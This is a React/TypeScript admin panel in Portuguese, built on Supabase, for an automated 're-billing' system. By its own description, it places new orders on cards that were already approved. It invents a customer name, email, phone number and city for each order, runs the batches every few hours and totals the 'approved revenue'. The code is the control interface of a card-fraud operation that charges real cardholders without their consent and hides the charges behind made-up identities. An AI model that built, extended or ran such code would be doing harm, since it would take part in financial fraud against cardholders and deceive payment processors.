import { useEffect, useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Switch } from "@/components/ui/switch";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Loader2, Play, RefreshCw } from "lucide-react";
import { toast } from "sonner";

interface Settings {
  active: boolean;
  batch_size: number;
  interval_hours: number;
  last_batch_at: string | null;
  last_run_at: string | null;
  last_result: any;
}

interface RebillOrder {
  id: string;
  source_order_number: string | null;
  product_name: string;
  amount: number;
  fake_name: string;
  fake_email: string;
  fake_phone: string;
  fake_city: string;
  fake_state: string;
  card_last4: string | null;
  card_brand: string | null;
  status: string;
  refusal_reason: string | null;
  created_at: string;
}

const STATUS_COLORS: Record<string, string> = {
  approved: "bg-emerald-500/15 text-emerald-600 dark:text-emerald-400",
  paid: "bg-emerald-500/15 text-emerald-600 dark:text-emerald-400",
  pending: "bg-amber-500/15 text-amber-600 dark:text-amber-400",
  refused: "bg-rose-500/15 text-rose-600 dark:text-rose-400",
  failed: "bg-rose-500/15 text-rose-600 dark:text-rose-400",
  error: "bg-rose-500/15 text-rose-600 dark:text-rose-400",
};

export function RebillPanel() {
  const [settings, setSettings] = useState<Settings | null>(null);
  const [orders, setOrders] = useState<RebillOrder[]>([]);
  const [loading, setLoading] = useState(true);
  const [saving, setSaving] = useState(false);
  const [running, setRunning] = useState(false);

  const load = async () => {
    const [s, o] = await Promise.all([
      supabase.from("rebill_settings").select("*").eq("id", true).single(),
      supabase.from("rebill_orders").select("*").order("created_at", { ascending: false }).limit(200),
    ]);
    if (s.data) setSettings(s.data as any);
    if (o.data) setOrders(o.data as any);
    setLoading(false);
  };

  useEffect(() => {
    load();
    const t = setInterval(load, 15000);
    return () => clearInterval(t);
  }, []);

  const toggleActive = async (active: boolean) => {
    setSaving(true);
    const { error } = await supabase.from("rebill_settings").update({ active }).eq("id", true);
    setSaving(false);
    if (error) toast.error("Erro ao salvar"); else {
      toast.success(active ? "Rebill ativado — roda em background" : "Rebill desativado");
      load();
    }
  };

  const runNow = async () => {
    setRunning(true);
    try {
      const { data, error } = await supabase.functions.invoke("rebill-cards", { body: { force: true } });
      if (error) throw error;
      toast.success(`Lote executado: ${data?.total ?? 0} pedidos, ${data?.approved ?? 0} aprovados`);
      load();
    } catch (e: any) {
      toast.error(e?.message || "Erro ao executar");
    } finally {
      setRunning(false);
    }
  };

  if (loading) return <div className="flex items-center justify-center py-20"><Loader2 className="animate-spin" /></div>;

  const approvedCount = orders.filter(o => ["approved","paid"].includes(o.status)).length;
  const totalRevenue = orders.filter(o => ["approved","paid"].includes(o.status)).reduce((s, o) => s + Number(o.amount), 0);

  return (
    <div className="space-y-6 animate-fade-in-fast">
      <Card className="p-6">
        <div className="flex flex-wrap items-center justify-between gap-4">
          <div>
            <h2 className="text-xl font-bold">Refaturamento de Cartões Aprovados</h2>
            <p className="text-sm text-muted-foreground mt-1">
              Faz novos pedidos usando cartões já aprovados com dados aleatórios. {settings?.batch_size ?? 4} pedidos a cada {settings?.interval_hours ?? 2}h, das 05h às 24h.
            </p>
          </div>
          <div className="flex items-center gap-3">
            <span className={`text-sm font-medium ${settings?.active ? "text-emerald-600" : "text-muted-foreground"}`}>
              {settings?.active ? "ATIVO" : "DESATIVADO"}
            </span>
            <Switch checked={!!settings?.active} disabled={saving} onCheckedChange={toggleActive} />
          </div>
        </div>

        <div className="grid grid-cols-2 md:grid-cols-4 gap-3 mt-6">
          <Stat label="Total no log" value={orders.length} />
          <Stat label="Aprovados" value={approvedCount} accent="text-emerald-600" />
          <Stat label="Receita aprovada" value={`R$ ${totalRevenue.toFixed(2).replace(".", ",")}`} accent="text-emerald-600" />
          <Stat label="Último lote" value={settings?.last_batch_at ? new Date(settings.last_batch_at).toLocaleString("pt-BR") : "—"} small />
        </div>

        <div className="flex gap-2 mt-6">
          <Button onClick={runNow} disabled={running} variant="outline" size="sm">
            {running ? <Loader2 className="animate-spin w-4 h-4 mr-2" /> : <Play className="w-4 h-4 mr-2" />}
            Executar lote agora
          </Button>
          <Button onClick={load} variant="ghost" size="sm">
            <RefreshCw className="w-4 h-4 mr-2" /> Atualizar
          </Button>
        </div>
      </Card>

      <Card className="p-0 overflow-hidden">
        <div className="p-4 border-b">
          <h3 className="font-semibold">Pedidos Refaturados ({orders.length})</h3>
        </div>
        <div className="overflow-x-auto">
          <table className="w-full text-sm">
            <thead className="bg-muted/40 text-xs uppercase text-muted-foreground">
              <tr>
                <th className="px-3 py-2 text-left">Data</th>
                <th className="px-3 py-2 text-left">Produto</th>
                <th className="px-3 py-2 text-left">Valor</th>
                <th className="px-3 py-2 text-left">Cliente fake</th>
                <th className="px-3 py-2 text-left">Cartão</th>
                <th className="px-3 py-2 text-left">Status</th>
                <th className="px-3 py-2 text-left">Motivo</th>
              </tr>
            </thead>
            <tbody>
              {orders.length === 0 && (
                <tr><td colSpan={7} className="text-center py-10 text-muted-foreground">Nenhum pedido refaturado ainda.</td></tr>
              )}
              {orders.map(o => (
                <tr key={o.id} className="border-t hover:bg-muted/30">
                  <td className="px-3 py-2 whitespace-nowrap text-xs">{new Date(o.created_at).toLocaleString("pt-BR")}</td>
                  <td className="px-3 py-2 max-w-[260px] truncate" title={o.product_name}>{o.product_name}</td>
                  <td className="px-3 py-2 whitespace-nowrap">R$ {Number(o.amount).toFixed(2).replace(".", ",")}</td>
                  <td className="px-3 py-2">
                    <div className="text-xs">{o.fake_name}</div>
                    <div className="text-xs text-muted-foreground">{o.fake_email}</div>
                    <div className="text-xs text-muted-foreground">{o.fake_city}/{o.fake_state}</div>
                  </td>
                  <td className="px-3 py-2 whitespace-nowrap text-xs">{o.card_brand} •••• {o.card_last4}</td>
                  <td className="px-3 py-2">
                    <Badge className={STATUS_COLORS[o.status] || "bg-muted"}>{o.status}</Badge>
                  </td>
                  <td className="px-3 py-2 text-xs text-muted-foreground max-w-[220px] truncate" title={o.refusal_reason || ""}>{o.refusal_reason || "—"}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </Card>
    </div>
  );
}

function Stat({ label, value, accent, small }: { label: string; value: any; accent?: string; small?: boolean }) {
  return (
    <div className="rounded-lg bg-muted/40 px-3 py-2">
      <div className="text-[10px] uppercase tracking-wide text-muted-foreground">{label}</div>
      <div className={`font-bold mt-0.5 ${small ? "text-xs" : "text-lg"} ${accent || ""}`}>{value}</div>
    </div>
  );
}
